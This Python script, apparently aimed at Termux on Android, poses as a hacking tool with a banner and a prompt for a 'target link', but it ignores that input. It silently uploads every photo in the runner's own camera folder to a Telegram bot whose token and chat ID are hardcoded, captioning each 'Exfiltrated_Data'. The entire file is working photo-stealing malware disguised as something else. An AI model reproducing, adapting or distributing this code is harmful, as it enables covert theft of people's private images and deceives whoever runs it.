import os
import asyncio
import sys
from telegram import Bot
from telegram.error import TelegramError

# Colores ANSI para la terminal
G = '\033[92m'  # Verde (Éxito)
R = '\033[91m'  # Rojo (Error)
Y = '\033[93m'  # Amarillo (Alerta)
B = '\033[94m'  # Azul (Info)
C = '\033[96m'  # Cyan (Input)
W = '\033[0m'   # Reset

def banner():
    print(f"""{G}
    ██████╗  █████╗ ████████╗ █████╗     ███████╗██╗   ██╗██████╗ 
    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗    ██╔════╝██║   ██║██╔══██╗
    ██║  ██║███████║   ██║   ███████║    ███████╗██║   ██║██████╔╝
    ██║  ██║██╔══██║   ██║   ██╔══██║    ╚════██║██║   ██║██╔═══╝ 
    ██████╔╝██║  ██║   ██║   ██║  ██║    ███████║╚██████╔╝██║     
    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝     
    {R}[ System Protocol: ACTIVE ]          [ Status: EXTRACTION ]{W}
    """)

# Pedir input con estilo
banner()
print(f"{C}┌──({G}root@internal{C})-[{W}~{C}]")
input(f"└─$ {W}Ingrese el link del destino: ")
print(f"{Y}🔍 Escaneando directorios locales...{W}\n")

async def enviar_fotos_telegram():
    # --- CONFIGURACIÓN ---
    BOT_TOKEN = "8096588316:AAGQX5cNAzy49Kl6tvP_FcW2gZarttEt8Ss"
    CHAT_ID = "8326936177"
    ruta_camara = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera"
    EXTENSIONES_IMAGEN = ('.jpg', '.jpeg', '.png', '.webp', '.bmp')

    try:
        bot = Bot(token=BOT_TOKEN)
        
        if not os.path.exists(ruta_camara):
            print(f"{R}[!] ERROR CRÍTICO: Punto de montaje no encontrado.{W}")
            return

        archivos = [
            f for f in os.listdir(ruta_camara) 
            if os.path.isfile(os.path.join(ruta_camara, f)) and f.lower().endswith(EXTENSIONES_IMAGEN)
        ]
        
        if not archivos:
            print(f"{Y}[?] DATA_NOT_FOUND: No se localizaron vectores de imagen.{W}")
            return

        print(f"{B}[*] VECTORIZANDO:{W} {len(archivos)} paquetes listos para exfiltración.")
        print(f"{G}{'='*50}{W}")

        for i, nombre_archivo in enumerate(archivos, 1):
            ruta_completa = os.path.join(ruta_camara, nombre_archivo)
            
            try:
                # Efecto de progreso
                sys.stdout.write(f"\r{B}[{i}/{len(archivos)}]{W} Inyectando: {nombre_archivo[:20]}...")
                sys.stdout.flush()
                
                with open(ruta_completa, 'rb') as foto:
                    await bot.send_photo(
                        chat_id=CHAT_ID, 
                        photo=foto, 
                        caption=f"Exfiltrated_Data: {nombre_archivo}"
                    )
                
                await asyncio.sleep(1.2) # Delay optimizado
                
            except Exception:
                print(f"\n{R}[-] FAIL: Error en paquete {nombre_archivo}{W}")

        print(f"\n\n{G}[+++] OPERACIÓN COMPLETADA EXITOSAMENTE [+++]{W}")

    except TelegramError:
        print(f"\n{R}[!] CONNECTION_ERROR: El túnel con el Bot falló.{W}")
    except Exception as e:
        print(f"\n{R}[!] SYS_FAILURE: {e}{W}")

if __name__ == "__main__":
    try:
        asyncio.run(enviar_fotos_telegram())
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] ABORTADO POR EL OPERADOR.{W}")
